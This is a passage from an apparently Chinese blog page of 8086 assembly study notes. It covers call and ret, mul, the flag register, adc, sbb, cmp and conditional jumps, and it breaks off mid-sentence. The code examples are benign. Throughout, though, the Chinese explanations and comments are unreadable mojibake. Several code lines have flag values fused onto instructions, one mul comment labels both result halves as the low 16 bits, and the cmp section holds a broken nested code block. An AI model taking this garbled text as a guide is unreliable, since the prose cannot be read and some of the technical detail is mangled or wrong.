href="#10-6-è½¬ç§»åœ°å€åœ¨å†…å­˜ä¸­çš„-call-æŒ‡ä»¤" class="headerlink" title="10.6 è½¬ç§»åœ°å€åœ¨å†…å­˜ä¸­çš„ call æŒ‡ä»¤"></a>10.6 è½¬ç§»åœ°å€åœ¨å†…å­˜ä¸­çš„ call æŒ‡ä»¤</h3><p><strong>1ï¼‰ call  word  ptr å†…å­˜å•å…ƒåœ°å€</strong></p><p>â€‹ç›¸å½“äº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push IP<br>jmp word ptr å†…å­˜å•å…ƒåœ°å€<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov sp,10h<br>mov ax,0123h<br>mov ds:[0],ax<br>call word ptr ds:[0]<br>//(IP)=0123H,(sp)=0EH<br></code></pre></td></tr></table></figure><p><strong>2) call  dword  ptr  å†…å­˜å•å…ƒåœ°å€</strong></p><p>â€‹ç›¸å½“äº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push CS<br>push IP<br>jmp dword ptr å†…å­˜å•å…ƒåœ°å€<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov sp,10h<br>mov ax,0123h<br>mov ds:[0],ax<br>mov word ptr ds:[2],0<br>call dword ptr ds:[0]//è¿›è¡Œä¸¤æ¬¡å‹æ ˆæ“ä½œï¼Œsp-2-2<br>//(CS)=0,(IP)=0123H,(sp)=0CH<br></code></pre></td></tr></table></figure><p>e.g ä¸‹é¢ç¨‹åºæ‰§è¡Œåï¼Œax å’Œ bx å€¼ä¸ºå¤šå°‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>data segment<br>dw 8 dup (0)<br>data ends<br>code segment<br> start:mov ax,data//3å­—èŠ‚<br> mov ss,ax//2å­—èŠ‚<br> mov sp,16//3å­—èŠ‚<br> mov word ptr ss:[0],offset s//7å­—èŠ‚<br> //(ss:[0]=1ah)<br> <br> mov ss:[2],cs//4å­—èŠ‚<br> //(ss:[2])=cs<br> <br> call dword ptr ss:[0]//7å­—èŠ‚<br> //cså…¥æ ˆ,ip=19hå…¥æ ˆï¼Œè½¬åˆ°cs:1ahå¤„æ‰§è¡ŒæŒ‡ä»¤ï¼Œ(ss:[4])=cs,(ss:[6])=ip<br> <br> nop<br> s:mov ax,offset s//ax=1ah<br> sub ax,ss:[0cH]<br> //ax=1ah-(ss:[0ch])=1ah-19h=1<br> <br> mov bx,cs//bx=cs=0c5bh<br> sub bx,ss:[0eH]//bx=cs-cs=0<br> mov ax,4c00h<br> int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="10-7-call-å’Œ-ret-çš„é…åˆä½¿ç”¨"><a href="#10-7-call-å’Œ-ret-çš„é…åˆä½¿ç”¨" class="headerlink" title="10.7 call å’Œ ret çš„é…åˆä½¿ç”¨"></a>10.7 call å’Œ ret çš„é…åˆä½¿ç”¨</h3><p>e.g bx çš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br> start:mov ax,1<br> mov cx,3<br> call s//IPæŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œå¹¶å‹æ ˆï¼Œå°†IPçš„å€¼æ”¹å˜ä¸ºæ ‡å·ä¸ºså¤„çš„åç§»åœ°å€<br> <br> mov bx,ax<br> <br> mov ax,4c00h<br> int 21h<br> s:add ax,ax<br> loop s//ax=8<br> ret//å‰å‹å…¥çš„æŒ‡ä»¤åç§»åœ°å€é€å…¥IPä¸­ã€‚CS:IPæŒ‡å‘æŒ‡ä»¤mov bx,axï¼Œä»æ­¤å¼€å§‹æ‰§è¡Œå‘½ä»¤ã€‚bx=8<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="10-8-mul-æŒ‡ä»¤"><a href="#10-8-mul-æŒ‡ä»¤" class="headerlink" title="10.8 mul æŒ‡ä»¤"></a>10.8 mul æŒ‡ä»¤</h3><ul><li><p>mul æ˜¯ä¹˜æ³•æŒ‡ä»¤</p></li><li><p>ä¸¤ä¸ªç›¸ä¹˜çš„æ•°ä½è¦ä¸€æ ·ï¼Œ<strong>8ä½é»˜è®¤æ”¾åœ¨ AL</strong> ä¸­ï¼Œå¦ä¸€ä¸ªæ”¾åœ¨8ä½ reg æˆ–å†…å­˜å­—èŠ‚å•å…ƒä¸­ï¼›<strong>16ä½æ”¾åœ¨AXä¸­</strong>ï¼Œå¦ä¸€ä¸ªæ”¾åœ¨16ä½ reg æˆ–å†…å­˜å­—å•å…ƒä¸­ã€‚</p></li><li><p>8ä½ä¹˜æ³•ï¼Œç»“æœé»˜è®¤æ”¾åœ¨ AX ä¸­ï¼›16ä½ï¼Œç»“æœé«˜ä½é»˜è®¤åœ¨ DX ä¸­ï¼Œä½ä½ AX ä¸­ã€‚</p></li></ul><p>æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mul reg<br>mul å†…å­˜å•å…ƒ<br></code></pre></td></tr></table></figure><p>å†…å­˜å•å…ƒå¯ä»¥ç”¨ä¸åŒçš„å¯»å€æ–¹å¼ç»™å‡ºï¼Œæ¯”å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mul byte ptr ds:[0]<br>//(ax)=(al)*((ds)*16+0)<br><br>mul word ptr [bx+si+8]<br>//(ax)=(ax)*((ds)*16+(bx)+(si)+8)ç»“æœçš„ä½16ä½<br>//(dx)=(ax)*((ds)*16+(bx)+(si)+8)ç»“æœçš„ä½16ä½<br></code></pre></td></tr></table></figure><p>e.g è®¡ç®— 100 * 10</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,100<br>mov bl,10<br>mul bl<br>//(ax)=1000(03E8H)<br></code></pre></td></tr></table></figure><p>â€‹è®¡ç®— 100 * 10000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,100<br>mov bx,10000<br>mul bx<br>//(ax)=4240H,(dx)=000FH<br></code></pre></td></tr></table></figure><h3 id="10-10-å‚æ•°å’Œç»“æœä¼ é€’çš„é—®é¢˜"><a href="#10-10-å‚æ•°å’Œç»“æœä¼ é€’çš„é—®é¢˜" class="headerlink" title="10.10 å‚æ•°å’Œç»“æœä¼ é€’çš„é—®é¢˜"></a>10.10 å‚æ•°å’Œç»“æœä¼ é€’çš„é—®é¢˜</h3><p>e.g è®¡ç®— data æ®µä¸­ç¬¬ä¸€ç»„æ•°æ®çš„ 3 æ¬¡æ–¹ï¼Œç»“æœä¿å­˜åœ¨åé¢ä¸€ç»„ dword å•å…ƒä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br> data segment<br> dw 1,2,3,4,5,6,7,8<br> dd 0,0,0,0,0,0,0,0<br> data ends<br> code segment<br> start:mov ax,data<br> mov ds,ax<br> mov si,0//ds:si æŒ‡å‘ç¬¬ä¸€ç»„ word å•å…ƒ<br> mov di,16//ds:si æŒ‡å‘ç¬¬äºŒç»„ dword å•å…ƒ<br> <br> mov cx,8<br> s:mov bx,[si]<br> call cube<br> mov [di],ax<br> mov [di].2,dx<br> add si,2//ds:si æŒ‡å‘ä¸‹ä¸€ä¸ª word å•å…ƒ<br> add di,4//ds:si æŒ‡å‘ä¸‹ä¸€ä¸ª dword å•å…ƒ<br> loop s<br> <br> mov ax,4c00h<br> int 21h<br> cube:mov ax,bx<br> mul bx<br> mul bx<br> ret<br> code ends<br>end start<br></code></pre></td></tr></table></figure><h1 id="åä¸€ã€æ ‡å¿—å¯„å­˜å™¨"><a href="#åä¸€ã€æ ‡å¿—å¯„å­˜å™¨" class="headerlink" title="åä¸€ã€æ ‡å¿—å¯„å­˜å™¨"></a>åä¸€ã€æ ‡å¿—å¯„å­˜å™¨</h1><p>æ ‡å¿—å¯„å­˜å™¨ flag æŒ‰ä½èµ·ä½œç”¨</p><p><img src="https://img.dkdun.cn/v1/2025/12/b4e62b03ac53ddf3.png"></p><h3 id="11-1-ZF-æ ‡å¿—"><a href="#11-1-ZF-æ ‡å¿—" class="headerlink" title="11.1 ZF æ ‡å¿—"></a>11.1 ZF æ ‡å¿—</h3><p>flag çš„ç¬¬ 6 ä½æ˜¯ ZF ï¼Œé›¶æ ‡å¿—ä½ã€‚å¦‚æœæ‰§è¡Œç›¸å…³æŒ‡ä»¤åï¼Œç»“æœä¸º 0ï¼Œzf &#x3D; 1;ä¸ä¸º 0ï¼Œzf &#x3D;0</p><h3 id="11-2-PFæ ‡å¿—"><a href="#11-2-PFæ ‡å¿—" class="headerlink" title="11.2 PFæ ‡å¿—"></a>11.2 PFæ ‡å¿—</h3><p>flag ç¬¬ 2 ä½æ˜¯ PFï¼Œå¥‡å¶æ ‡å¿—ä½ã€‚è®°å½•ç›¸å…³æŒ‡ä»¤æ‰§è¡Œåï¼Œç»“æœçš„æ‰€æœ‰ bit ä½ä¸­1çš„ä¸ªæ•°æ˜¯å¦ä¸ºå¶æ•°ï¼Œå¦‚æœæ˜¯å¶æ•°ï¼Œpf &#x3D; 1ï¼Œå¦‚æœæ˜¯å¥‡æ•°ï¼Œpf &#x3D; 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,1<br>add al,10<br>//00001011Bï¼Œ3ä¸ª1ï¼Œpf=0<br>mov al,1<br>or al,2<br>//æ‰§è¡Œåï¼Œç»“æœä¸º 00000011Bï¼Œæœ‰ 2 ä¸ª1ï¼Œpf=1<br>sub al,al<br>// 00000000B,0ä¸ªå¶æ•°ï¼Œpf=1<br></code></pre></td></tr></table></figure><h3 id="11-3-SF-æ ‡å¿—"><a href="#11-3-SF-æ ‡å¿—" class="headerlink" title="11.3 SF æ ‡å¿—"></a>11.3 SF æ ‡å¿—</h3><p>flag ç¬¬7ä½ï¼Œç¬¦å·æ ‡å¿—ä½ã€‚è®°å½•æ‰§è¡ŒæŒ‡ä»¤åï¼Œç»“æœæ˜¯å¦ä¸ºè´Ÿã€‚ç»“æœä¸ºè´Ÿï¼Œsf &#x3D;1ï¼›å¦‚æœéè´Ÿï¼Œsf &#x3D;0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub al,al ZF=1  PF=1  SF=0<br>mov al,1110<br>push ax110<br>pop bx110<br>//mov,push,popç­‰ä¼ é€æŒ‡ä»¤å¯¹æ ‡å¿—å¯„å­˜å™¨æ²¡å½±å“<br>add al,bl000<br>add al,10010<br>mul al010<br></code></pre></td></tr></table></figure><h3 id="11-4-CF-æ ‡å¿—"><a href="#11-4-CF-æ ‡å¿—" class="headerlink" title="11.4 CF æ ‡å¿—"></a>11.4 CF æ ‡å¿—</h3><p>flag ç¬¬ 0 ä½æ˜¯ CFï¼Œè¿›ä½æ ‡å¿—ä½ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåœ¨è¿›è¡Œæ— ç¬¦å·è¿ç®—æ—¶ï¼Œè®°å½•äº†è¿ç®—ç»“æœçš„æœ€é«˜æœ‰æ•ˆä½å‘è·Ÿé«˜ä½çš„è¿›ä½å€¼ï¼Œæˆ–ä»æ›´é«˜ä½çš„å€Ÿä½å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,98H<br>add al,al//(al)=30H,CF=1,CFè®°å½•äº†ä»æœ€é«˜æœ‰æ•ˆä½å‘è·Ÿé«˜ä½çš„è¿›ä½å€¼<br>add al,al//(al)=60H,CF=0<br><br>mov al,97H<br>sub al,98H//(al)=FFH,CF=1ï¼ŒCFè®°å½•äº†å‘æ›´é«˜ä½çš„å€Ÿä½å€¼<br>sub al,al//(al)=0,CF=0<br></code></pre></td></tr></table></figure><h3 id="11-5-OF-æ ‡å¿—"><a href="#11-5-OF-æ ‡å¿—" class="headerlink" title="11.5 OF æ ‡å¿—"></a>11.5 OF æ ‡å¿—</h3><p>flag ç¬¬ 11 ä½æ˜¯ OFï¼Œæº¢å‡ºæ ‡å¿—ä½ã€‚OF è®°å½•æœ‰ç¬¦å·æ•°è¿ç®—çš„ç»“æœæ˜¯å¦å‘ç”Ÿæº¢å‡ºã€‚æº¢å‡º OF &#x3D; 1ï¼Œæ²¡æœ‰ OF &#x3D; 0           </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,0F0H<br>add al,88H<br>//æ‰§è¡Œåï¼ŒCF=1ï¼ŒOF=1.æ— ç¬¦å·è¿ç®—,0F0H+88Hæœ‰è¿›ä½,CF=1;æœ‰ç¬¦å·è¿ç®—,0F0H+88Hå‘ç”Ÿæº¢å‡º,OF=1<br><br>mov al,0F0H<br>add al,78H<br>//CF=1,OF=0.æ— ç¬¦å·è¿ç®—0F0H+78Hæœ‰è¿›ä½,CF=1;æœ‰ç¬¦å·è¿ç®—,0F0H+78Hä¸å‘ç”Ÿæº¢å‡º,OF=0<br></code></pre></td></tr></table></figure><p>e.g ä¸‹åˆ—æ¯æ¡æŒ‡ä»¤æ‰§è¡Œåï¼ŒZF ã€PFã€SFã€CFã€OFç­‰æ ‡å¿—ä½çš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub al,al//ZF=1,PF=1,SF=0,CF=0,OF=0<br>mov al,10H//11000<br>add al,90H//01100<br>mov al,80H//01100<br>add al,80H//11011<br>mov al,0FCH//11011<br>add al,05H//00010<br>mov al,7DH//00010<br>add al,0BH//01101<br></code></pre></td></tr></table></figure><h3 id="11-6-adc-æŒ‡ä»¤"><a href="#11-6-adc-æŒ‡ä»¤" class="headerlink" title="11.6 adc æŒ‡ä»¤"></a>11.6 adc æŒ‡ä»¤</h3><p><strong>adc ä¸ºå¸¦è¿›ä½åŠ æ³•æŒ‡ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">æ ¼å¼:adc æ“ä½œå¯¹è±¡1,æ“ä½œå¯¹è±¡2<br>åŠŸèƒ½:æ“ä½œå¯¹è±¡1 = æ“ä½œå¯¹è±¡1 + æ“ä½œå¯¹è±¡2 + CF<br>//æŒ‡ä»¤: adc ax,bx<br>//(ax)=(ax)+(bx)+CF<br></code></pre></td></tr></table></figure><p>e.g </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2<br>mov bx,1<br>sub bx,ax<br>adc ax,1<br>//(ax)=4,(ax)+1+CF=4<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,1<br>add ax,ax<br>adc ax,3<br>//(ax)=2+3+0=5<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,98H<br>add al,al<br>adc al,3<br>//(al)=34H,(al)+3+CF=30H+3+1=34H<br></code></pre></td></tr></table></figure><p><strong>æ‰§è¡Œ adc æŒ‡ä»¤æ—¶ï¼ŒCF çš„å€¼å¦‚æœæ˜¯è¢« sub æŒ‡ä»¤è®¾ç½®çš„ï¼Œé‚£ä¹ˆå°±æ˜¯å€Ÿä½å€¼</strong></p><p><strong>add æŒ‡ä»¤è®¾ç½®æ—¶ï¼Œæ˜¯è¿›ä½å€¼</strong></p><p>åŠ æ³•å¯ä»¥åˆ†ä¸¤éƒ¨è¿›è¡Œï¼š</p><ul><li>ä½ä½ç›¸åŠ ï¼Œæ¯”å¦‚ 0198H å’Œ 0183Hã€‚ä½ä½ç›¸åŠ å¾— 1B</li><li>é«˜ä½ç›¸åŠ å†åŠ ä¸Šä½ä½ç›¸åŠ çš„è¿›ä½å€¼ã€‚01+01+1&#x3D;03</li></ul><p>e.g è®¡ç®— 1EF0001000H + 2010001EF0Hï¼Œç»“æœæ”¾åœ¨ ax(æœ€é«˜ 16 ä½)ï¼Œbx(æ¬¡é«˜ 16 ä½)ï¼Œcx(ä½ 16 ä½)ä¸­</p><ul><li>å…ˆå°†ä½ 16 ä½ç›¸åŠ ï¼Œç„¶å CF ä¸­è®°å½•æœ¬æ¬¡ç›¸åŠ çš„è¿›ä½å€¼</li><li>å†å°†é«˜ 16 ä½å’Œ CF ç›¸åŠ ï¼Œç„¶å CFè®°å½•è¿›ä½å€¼</li><li>æœ€åé«˜ 16 ä½å’Œ CFç›¸åŠ ï¼ŒCFè®°å½•è¿›ä½å€¼</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,001EH<br>mov bx,0F000H<br>mov cx,1000H<br>add cx,1EF0H<br>add bx,1000H<br>add ax,0020H<br></code></pre></td></tr></table></figure><h3 id="11-7-sbbæŒ‡ä»¤"><a href="#11-7-sbbæŒ‡ä»¤" class="headerlink" title="11.7 sbbæŒ‡ä»¤"></a>11.7 sbbæŒ‡ä»¤</h3><p><strong>sbb æ˜¯å¸¦å€Ÿä½å‡æ³•æŒ‡ä»¤ï¼Œåˆ©ç”¨ CF ä½ä¸Šè®°å½•çš„å€Ÿä½å€¼</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sbb æ“ä½œå¯¹è±¡1ï¼Œæ“ä½œå¯¹è±¡2<br>æ“ä½œå¯¹è±¡1 = æ“ä½œå¯¹è±¡1 - æ“ä½œå¯¹è±¡2 - CF<br>//sbb ax,bx<br>//(ax)=(ax)-(bx)-CF<br></code></pre></td></tr></table></figure><p>e.g è®¡ç®— 003E1000H - 00202000H,ç»“æœæ”¾åœ¨ ax,bx ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov bx,1000H<br>mov ax,003EH<br>sub bx,2000H<br>sbb ax,0020H<br></code></pre></td></tr></table></figure><h3 id="11-8-cmp-æŒ‡ä»¤"><a href="#11-8-cmp-æŒ‡ä»¤" class="headerlink" title="11.8 cmp æŒ‡ä»¤"></a>11.8 cmp æŒ‡ä»¤</h3><p><strong>cmp ä¸ºæ¯”è¾ƒæŒ‡ä»¤ï¼Œç›¸å½“äºå‡æ³•ï¼Œä½†ä¸ä¿å­˜ç»“æœã€‚æ‰§è¡Œåä¼šå¯¹æ ‡å¿—å¯„å­˜å™¨äº§ç”Ÿå½±å“ã€‚</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">æ ¼å¼ï¼šcmp æ“ä½œå¯¹è±¡1ï¼Œæ“ä½œå¯¹è±¡2<br>åŠŸèƒ½ï¼šè®¡ç®—æ“ä½œå¯¹è±¡1 - æ“ä½œå¯¹è±¡2ï¼Œä¸ä¿å­˜ç»“æœï¼Œä»…ä»…æ ¹æ®è®¡ç®—ç»“æœå¯¹æ ‡å¿—å¯„å­˜å™¨è¿›è¡Œè®¾ç½®<br>//cmp ax,ax<br>//ç»“æœä¸º 0 ï¼ŒæŒ‡ä»¤æ‰§è¡Œå zf=1,pf=1,sf=0,cf=0,of=0<br></code></pre></td></tr></table></figure><p>e.g </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,8<br>mov bx,3<br>cmp ax,bx<br>//(ax)=8,zf=0,pf=1,sf=0,cf=0,of=0<br></code></pre></td></tr></table></figure><p><strong>å¯¹äº cmp ax,bxï¼Œæœ‰å¦‚ä¸‹åˆ†æ</strong></p><ul><li><pre><code class="assembly">if (ax==bx),(ax)-(bx)=0,zf=1if (ax!=bx),(ax)-(bx)!=0,zf=0if (ax&lt;bx),(ax)-(bx)&lt;0,äº§ç”Ÿå€Ÿä½,cf=1if (ax&gt;=bx),(ax)-(bx)&gt;=0,cf=0if (ax&gt;bx),(ax)-(bx)&gt;0,cf=0 æˆ– zf=0if (ax&lt;=bx),(ax)-(bx)&lt;=0,cf=1 æˆ– zf=1 if:    zf=1,è¯´æ˜ (ax)=(bx)    zf=0,(ax)!=(bx)    cf=1,(ax)&lt;(bx)    cf=0,(ax)&gt;=(bx)    cf=0 ä¸” zf=0,(ax)&gt;(bx)    cf=1 æˆ– zf=1,(ax)&lt;=(bx)<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><br><br>å¯¹æœ‰ç¬¦å·æ•°è¿›è¡Œæ¯”è¾ƒæ—¶<br><br>**å¯¹äº<span class="hljs-keyword">cmp</span> <span class="hljs-number">ah</span>,<span class="hljs-number">bh</span>**<br><br><span class="hljs-string">```</span>assembly<br>if (<span class="hljs-number">ah</span>==<span class="hljs-number">bh</span>),(<span class="hljs-number">ah</span>)-(<span class="hljs-number">bh</span>)=<span class="hljs-number">0</span>,zf=<span class="hljs-number">1</span><br>if (<span class="hljs-number">ah</span>!=<span class="hljs-number">bh</span>),(<span class="hljs-number">ah</span>)-(<span class="hljs-number">bh</span>)!=<span class="hljs-number">0</span>,zf=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><ol><li><p>å¦‚æœ sf &#x3D;1,of&#x3D;0</p><p>of &#x3D;0ï¼Œæ²¡æœ‰æº¢å‡ºï¼Œé€»è¾‘ä¸ŠçœŸæ­£ç»“æœçš„æ­£è´Ÿ &#x3D; å®é™…ç»“æœçš„æ­£è´Ÿ</p><p>sf &#x3D;1ï¼Œå®é™…ç»“æœä¸ºè´Ÿæ•°ï¼Œæ‰€ä»¥é€»è¾‘ä¸ŠçœŸæ­£çš„ç»“æœä¸ºè´Ÿï¼Œ(ah)&lt;(bh)</p></li><li><p>å¦‚æœ sf &#x3D;1ï¼Œof &#x3D;1</p><p>of &#x3D;1ï¼Œæœ‰æº¢å‡ºï¼Œé€»è¾‘ä¸ŠçœŸæ­£ç»“æœçš„æ­£è´Ÿä¸å®é™…ç»“æœçš„æ­£è´Ÿä¸ç›¸ç­‰</p><p>sf &#x3D;1ï¼Œå®é™…ç»“æœä¸ºè´Ÿ</p><p><strong>å¦‚æœå› ä¸ºæº¢å‡ºå¯¼è‡´å®é™…ç»“æœä¸ºè´Ÿï¼Œé‚£ä¹ˆé€»è¾‘ä¸ŠçœŸæ­£çš„ç»“æœä¸ºæ­£ï¼ˆah)&gt;(bh)</strong></p></li><li><p>å¦‚æœ sf &#x3D; 0,of &#x3D; 1</p><p>sf&#x3D;0ï¼Œå®é™…ç»“æœä¸ºéè´Ÿï¼Œè€Œ of &#x3D;1 è¯´æ˜æœ‰æº¢å‡º ï¼Œç»“æœä¸ºé 0 ï¼Œå®é™…ç»“æœä¸ºæ­£</p><p><strong>å¦‚æœå› ä¸ºæº¢å‡ºå¯¼è‡´å®é™…ç»“æœä¸ºéè´Ÿï¼Œé‚£ä¹ˆé€»è¾‘ä¸ŠçœŸæ­£ç»“æœä¸ºè´Ÿï¼Œï¼ˆah)&lt;(bh)</strong></p></li><li><p>sf &#x3D;0,of &#x3D;0</p><p>æ²¡æœ‰æº¢å‡ºï¼Œå®é™…ç»“æœä¸ºéè´Ÿï¼Œï¼ˆah)&gt;&#x3D;(bh)</p></li></ol><h3 id="11-9-æ£€æµ‹æ¯”è¾ƒç»“æœçš„æ¡ä»¶è½¬ç§»æŒ‡ä»¤"><a href="#11-9-æ£€æµ‹æ¯”è¾ƒç»“æœçš„æ¡ä»¶è½¬ç§»æŒ‡ä»¤" class="headerlink" title="11.9 æ£€æµ‹æ¯”è¾ƒç»“æœçš„æ¡ä»¶è½¬ç§»æŒ‡ä»¤"></a>11.9 æ£€æµ‹æ¯”è¾ƒç»“æœçš„æ¡ä»¶è½¬ç§»æŒ‡ä»¤</h3><p>â€œ è½¬ç§» â€æŒ‡å®ƒèƒ½ä¿®æ”¹ IPï¼Œâ€œ æ¡ä»¶ â€æŒ‡å®ƒå¯ä»¥æ ¹æ®æŸç§æ¡ä»¶ï¼Œå†³å®šæ˜¯å¦ä¿®æ”¹ IP</p><table><thead><tr><th>æŒ‡ä»¤</th><th>å«ä¹‰</th><th>æ£€æµ‹çš„ç›¸å…³æ ‡å¿—ä½</th></tr></thead><tbody><tr><td>je</td><td>ç­‰äºåˆ™è½¬ç§»</td><td>zf &#x3D; 1</td></tr><tr><td>jne</td><td>ä¸ç­‰äºå°±è½¬ç§»</td><td>zf &#x3D; 0</td></tr><tr><td>jb</td><td>ä½äºåˆ™è½¬ç§»</td><td>cf &#x3D;1</td></tr><tr><td>jnb</td><td>ä¸ä½äºå°±è½¬ç§»</td><td>cf &#x3D; 0</td></tr><tr><td>ja</td><td>é«˜äºå°±è½¬ç§»</td><td>cf &#x3D; 0ä¸” zf &#x3D;0</td></tr><tr><td>jna</td><td>ä¸é«˜äºå°±è½¬ç§»</td><td>cf &#x3D;1 æˆ– zf &#x3D; 1</td></tr></tbody></table><p><strong>e.g</strong>  ç»Ÿè®¡ data æ®µä¸­æ•°å€¼å°äº 